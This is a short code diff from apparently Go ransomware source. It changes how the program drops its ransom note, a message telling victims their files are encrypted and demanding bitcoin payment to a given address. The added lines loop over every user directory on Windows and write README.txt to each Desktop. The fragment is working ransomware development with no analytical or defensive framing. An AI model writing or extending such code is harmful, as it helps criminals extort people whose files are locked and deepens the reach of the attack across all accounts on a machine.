@@ -194,7 +194,17 @@ func main() {
 		text := "Your files have been encrypted. Please pay " + payment.Amount + " satoshi to the following bitcoin address if you want to decrypt them: " + payment.Address + " . Use https://www.blockchain.com/btc/address/" + payment.Address + " to check the status of your payment. Once the transaction has 6+ confirmations you can run the decrpytion tool to decrypt your files. If this proccess is unclear to you, please reach out to: " + contact + ". Have a nice day!\nMachine ID: " + id
 
 		if runtime.GOOS == "windows" {
-			ioutil.WriteFile(home+"\\Desktop\\README.txt", []byte(text), 0644)
+			users, err := ioutil.ReadDir(home)
+			if err != nil {
+				log.Fatal(err)
+			}
+
+			for _, user := range users {
+				if user.IsDir() {
+					ioutil.WriteFile(home+user.Name()+"\\Desktop\\README.txt", []byte(text), 0644)
+				}
+			}
+
 		} else {
 			ioutil.WriteFile(home+"/README.txt", []byte(text), 0644)
 		}
